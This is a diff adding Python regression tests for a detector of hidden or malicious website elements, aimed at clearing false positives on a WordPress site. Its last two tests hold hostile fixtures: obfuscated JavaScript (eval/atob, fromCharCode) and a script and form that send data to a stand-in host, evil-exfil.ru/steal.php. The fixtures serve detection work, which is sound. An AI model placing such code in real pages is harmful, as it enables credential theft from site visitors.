@@ -179,3 +179,48 @@ class TestTimeHelpers:
 
     def test_is_check_due_invalid(self):
         assert is_check_due("not-a-date", 24) is True
+
+
+class TestHiddenElementsFalsePositives:
+    """
+    Regression: the classifier flagged legitimate sites (millewin.it — a real
+    WordPress app with a login area) as CRITICAL "compromise/credential kit".
+    Causes: (1) wp-emoji \\uXXXX sequences marked as obfuscated JS, (2) the site's
+    own /wp-content/ resources counted as external, (3) any login text = alert.
+    Fix must clear these FPs WITHOUT creating false negatives on real phishing.
+    """
+    from shared.utils import detect_hidden_elements as _d
+
+    def test_wp_emoji_unicode_not_flagged_as_obfuscated(self):
+        from shared.utils import detect_hidden_elements
+        html = ('<script>const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent);'
+                'var e="\\u1f600\\u1f601\\u1f602\\u1f603\\u1f604\\u1f605\\u1f606\\u1f607\\u1f608\\u1f609'
+                '\\u1f60a\\u1f60b\\u1f60c\\u1f60d\\u1f60e";</script>')
+        r = detect_hidden_elements(html, self_domain="millewin.it")
+        # unicode escapes alone (no eval/atob/etc) must NOT count as obfuscation
+        assert len(r.get("obfuscated_js", [])) == 0
+
+    def test_self_hosted_resources_not_external(self):
+        from shared.utils import detect_hidden_elements
+        html = ('<link href="https://millewin.it/wp-content/themes/x/style.css">'
+                '<script src="https://millewin.it/wp-includes/js/jquery.js"></script>'
+                '<a href="https://download.millewin.it/files/tool.exe">dl</a>')
+        r = detect_hidden_elements(html, self_domain="millewin.it")
+        ext = r.get("external_resources", [])
+        assert not any("millewin.it" in u for u in ext)
+
+    def test_real_obfuscation_still_detected(self):
+        from shared.utils import detect_hidden_elements
+        html = ('<script>eval(atob("dmFy"));document.write(unescape("%3C"));'
+                'var x=String.fromCharCode(104,116);</script>')
+        r = detect_hidden_elements(html, self_domain="evil.com")
+        # genuine obfuscation (eval/atob/document_write/fromCharCode) MUST be flagged
+        assert len(r.get("obfuscated_js", [])) >= 1
+
+    def test_real_external_malicious_still_detected(self):
+        from shared.utils import detect_hidden_elements
+        html = ('<script src="https://evil-exfil.ru/c.js"></script>'
+                '<form action="https://evil-exfil.ru/steal.php"></form>')
+        r = detect_hidden_elements(html, self_domain="kerdion-fake.com")
+        ext = r.get("external_resources", [])
+        assert any("evil-exfil.ru" in u for u in ext)
